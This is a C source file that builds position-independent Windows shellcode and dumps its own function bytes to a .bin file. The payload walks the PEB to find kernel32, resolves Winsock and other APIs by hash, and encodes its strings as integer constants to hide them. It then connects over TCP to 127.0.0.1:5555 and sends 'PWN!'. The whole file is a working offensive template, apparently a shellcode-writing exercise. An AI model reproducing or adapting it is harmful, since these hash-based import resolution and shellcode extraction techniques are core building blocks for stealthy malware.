#include "common.h"
#include "api.h"
#include "shellcode.h"

#pragma comment(linker, "/Entry:Entry")

#define CHECK(func) if(func == NULL){goto end;}
#define CHECKNULL(func) if(func != 0){goto end;}
#define HTONS(A) ((((unsigned short int)(A) & 0xff00) >> 8) | (((unsigned short int)(A) & 0x00ff) << 8))

#define HASH_LoadLibraryA               0x071d2c76
#define HASH_GetProcAddress             0xc2cbc15a
#define HASH_MessageBoxA                0x4ce54ccf
#define HASH_ExitProcess                0xcbff6bb9
#define HASH_ExitThread                 0x451d7512
#define HASH_WSAStartup                 0x2b7ae73e
#define HASH_socket                     0x1451fe69
#define HASH_inet_addr                  0xbf92328a
#define HASH_inet_pton                  0xbf9ab1b0
#define HASH_connect                    0xcfb6b06a
#define HASH_send                       0x0040cbca
#define HASH_recv                       0x00403e10
#define HASH_closesocket                0x5de2e91f
#define HASH_WSACleanup                 0x496ccc33

typedef struct _ADDRESS_TABLE
{
	PVOID Kernel32_BaseAddr;
	PVOID NTdll_BaseAddr;
	HMODULE User32;
	HMODULE ws2_32;

	T_htons          phtons;
	T_socket         pSocket;
	T_gethostbyname  pGetHost;
	T_ExitThread     pExitthread;
	T_WSAStartup     pWSAStartup;
	T_WSACleanup     pWSAcleanup;
	T_LoadLibrary    pLoadLibrary;
	T_ExitProcess    pExitProcess;
	T_GetProcAddress pGetProcAddress;
	T_inet_pton      pinetpton;
	T_connect        pConnect;
	T_send           pSend;
	T_recv           pRecv;
	T_closesocket    pClosesock;
	

	DWORD sz_String[2];
	DWORD sz_Local[4];
	
	DWORD winsock[4];
	
	

	SOCKET  sock;





}ADDRESS_TABLE;



int EntryMain();
HMODULE GetProcAddrByHash(PVOID LibBaseAddr, DWORD FnHash);
void CreateShellCode();
HMODULE GetKernel32Base();
DWORD HashKey(char* key);
void ShellCodeEnd();

void Entry()
{
	CreateShellCode();
}
void CreateShellCode() {
#if defined(_WIN64)
	HANDLE hFile = CreateFileA("ShellCode_x64.bin", GENERIC_ALL, 0, NULL, CREATE_ALWAYS, 0, NULL);
#else
	HANDLE hFile = CreateFileA("ShellCode_x86.bin", GENERIC_ALL, 0, NULL, CREATE_ALWAYS, 0, NULL);
#endif
	if (hFile == INVALID_HANDLE_VALUE)
	{
		MessageBoxA(NULL, "CreateFileA Error", "Error", MB_ERR_INVALID_CHARS);
		return;
	}
#if defined(_WIN64)
	ULONG_PTR dwSize = (ULONG_PTR)ShellCodeEnd - (ULONG_PTR)EntryMain;
#else
	DWORD dwSize = (DWORD)ShellCodeEnd - (DWORD)EntryMain;
#endif
	DWORD dwWrite = 0;
	WriteFile(hFile, EntryMain, dwSize, &dwWrite, NULL);
	CloseHandle(hFile);
}


int EntryMain() { 
	ADDRESS_TABLE Addrs;
	WSADATA wsaData;
	SOCKADDR_IN sockAddr;
	memset(&sockAddr, 0, sizeof(sockAddr));
	//初始化api
	Addrs.Kernel32_BaseAddr = GetKernel32Base();
	Addrs.pExitProcess = GetProcAddrByHash(Addrs.Kernel32_BaseAddr, HASH_ExitProcess);
	Addrs.pLoadLibrary = GetProcAddrByHash(Addrs.Kernel32_BaseAddr, HASH_LoadLibraryA);
	Addrs.pGetProcAddress = GetProcAddrByHash(Addrs.Kernel32_BaseAddr, HASH_GetProcAddress);
	CHECK(Addrs.pLoadLibrary);
	CHECK(Addrs.pGetProcAddress);
	Addrs.winsock[0] = 0x5f327357;  //string "Ws2_32.dll"
	Addrs.winsock[1] = 0x642e3233;
	Addrs.winsock[2] = 0x00006c6c;
	Addrs.ws2_32 = Addrs.pLoadLibrary(Addrs.winsock);
	CHECK(Addrs.ws2_32);
	Addrs.pWSAStartup = GetProcAddrByHash(Addrs.ws2_32, HASH_WSAStartup);
	Addrs.pinetpton = GetProcAddrByHash(Addrs.ws2_32, HASH_inet_pton);
	Addrs.pSocket = GetProcAddrByHash(Addrs.ws2_32, HASH_socket);
	Addrs.pConnect = GetProcAddrByHash(Addrs.ws2_32, HASH_connect);
	Addrs.pSend = GetProcAddrByHash(Addrs.ws2_32, HASH_send);
	Addrs.pRecv = GetProcAddrByHash(Addrs.ws2_32, HASH_recv);
	Addrs.pClosesock = GetProcAddrByHash(Addrs.ws2_32, HASH_closesocket);
	Addrs.pWSAcleanup = GetProcAddrByHash(Addrs.ws2_32, HASH_WSACleanup);
	CHECK(Addrs.pWSAStartup);
	CHECK(Addrs.pinetpton);
	CHECK(Addrs.pSocket);
	CHECK(Addrs.pConnect);
	CHECK(Addrs.pSend);
	CHECK(Addrs.pRecv);
	CHECK(Addrs.pClosesock);
	CHECK(Addrs.pWSAcleanup);
	CHECKNULL(Addrs.pWSAStartup(MAKEWORD(2, 2), &wsaData));
	Addrs.sock = Addrs.pSocket(AF_INET, SOCK_STREAM, IPPROTO_TCP);
	Addrs.sz_Local[0] = 0x2e373231;//127.0.0.1
	Addrs.sz_Local[1] = 0x2e302e30;
	Addrs.sz_Local[2] = 0x00000031;
	sockAddr.sin_family = AF_INET;
	sockAddr.sin_port = HTONS(5555);
	Addrs.pinetpton(AF_INET, Addrs.sz_Local, &sockAddr.sin_addr);
	CHECKNULL(Addrs.pConnect(Addrs.sock, (sockaddr*)&sockAddr, sizeof(sockAddr)));
	Addrs.sz_String[0] = 0x214e5750;
	Addrs.sz_String[1] = 0x00000000;
	Addrs.pSend(Addrs.sock, Addrs.sz_String, 8, 0);
	Addrs.pClosesock(Addrs.sock);
	Addrs.pWSAcleanup();


	
	
	
	
end:
	Addrs.pExitProcess(0);
	return 0;
}

HMODULE GetKernel32Base() 
{
	PPEB pPEB;
	PMY_PEB_LDR_DATA pLdr;
	PLIST_ENTRY pNextModule;
	PMY_LDR_DATA_TABLE_ENTRY pDataTableEntry;
#if defined(_WIN64)
	pPEB = (PPEB)__readgsqword(0x60);
#else
	pPEB = (PPEB)__readfsdword(0x30);
#endif
	pLdr = (PMY_PEB_LDR_DATA)pPEB->Ldr;
	pNextModule = pLdr->InLoadOrderModuleList.Flink; //get link head ptr

	for (int i = 0; i < 3; i++) {
		pDataTableEntry = (PMY_LDR_DATA_TABLE_ENTRY)pNextModule;
		if (pDataTableEntry->BaseDllName.Buffer[8] == 0x006B) break;
		pNextModule = pNextModule->Flink;
	}

	return pDataTableEntry->DllBase;
}

HMODULE GetProcAddrByHash(PVOID LibBaseAddr, DWORD FnHash) {
	DWORD* pNameBase;
	PIMAGE_DOS_HEADER pDos;
	PIMAGE_NT_HEADERS pNT;
	PIMAGE_EXPORT_DIRECTORY pExport;
	HMODULE Function;
	BOOL Found = FALSE;

	pDos = (PIMAGE_DOS_HEADER)LibBaseAddr;
	pNT = (PIMAGE_NT_HEADERS)((ULONG_PTR)LibBaseAddr + ((PIMAGE_DOS_HEADER)LibBaseAddr)->e_lfanew);
	pExport = (PIMAGE_EXPORT_DIRECTORY)((ULONG_PTR)LibBaseAddr + pNT->OptionalHeader.DataDirectory[0].VirtualAddress);
	pNameBase = (DWORD*)((ULONG_PTR)LibBaseAddr + pExport->AddressOfNames);
	int Ordinals;
	for (Ordinals = 0; Ordinals < pExport->NumberOfNames; Ordinals++) 
	{
		char* pName = (char*)LibBaseAddr + *pNameBase;
		if (HashKey(pName) == FnHash) {
			Found = TRUE;
			break;
		}
		pNameBase++;
	}
	if (Found) {
		WORD Index;
		Index = ((WORD*)((ULONG_PTR)LibBaseAddr + pExport->AddressOfNameOrdinals))[Ordinals];
		DWORD offset = ((DWORD*)((ULONG_PTR)LibBaseAddr + pExport->AddressOfFunctions))[Index];
		Function = (HMODULE)((ULONG_PTR)LibBaseAddr + offset);
		return Function;
	}
	return NULL;

}


__forceinline DWORD HashKey(char* key)
{
	DWORD nHash = 0;
	while (*key)
	{
		nHash = (nHash << 5) + nHash + *key++;
	}
	return nHash;
}

void ShellCodeEnd()
{

}
